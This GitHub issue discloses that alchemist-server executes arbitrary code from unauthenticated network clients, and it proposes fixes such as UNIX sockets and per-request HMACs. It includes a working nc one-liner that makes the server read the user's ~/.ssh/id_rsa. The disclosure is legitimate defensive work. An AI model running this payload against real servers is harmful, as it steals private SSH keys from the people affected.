## Description

[![@ivan](https://avatars.githubusercontent.com/u/4458?u=69de5467b1bb1a02f29599eb585aef90108ece38&v=4&size=48)](/ivan)[ivan](https://github.com/ivan)opened [on Feb 21, 2017](https://github.com/tonini/alchemist-server/issues/14#issue-209295788)

alchemist-server starts a server that executes arbitrary code from any host that can reach you on the network, without any kind of authentication.

```
git clone https://github.com/tonini/alchemist-server
cd alchemist-server
elixir run.exs --env=dev --listen

```

Take note of the port, because the exploit below doesn't brute-force the port (though this could easily be done by an attacker).

```
# echo 'EVAL File.write!("/tmp/payload", "File.read!(Path.expand(~s(~/.ssh/id_rsa)))");{:eval, "/tmp/payload"}' | nc 127.0.0.1 PORT
"Fake RSA key\n"
END-OF-EVAL

```

This also works from a remote machine because alchemist-server listens on all interfaces, not just localhost.

Listening on localhost by default would be a good idea, but is insufficient, because it still leaves the user open to attacks from other (less-trusted) users on the machine, and possibly from the user's web browser via a DNS rebinding attack.

~~Requiring a secret cookie before accepting any requests would be a good idea~~ (beware, though, the secret needs a constant-time comparison). Even better would be to use a UNIX socket.

A secret cookie at the start of the connection is not a bulletproof fix because TCP connections can be hijacked in some cases. ycmd had the same problem with code execution and now [HMACs every request](https://github.com/Valloric/ycmd#api-notes), which seems like a better idea (if using a UNIX socket is impossible).
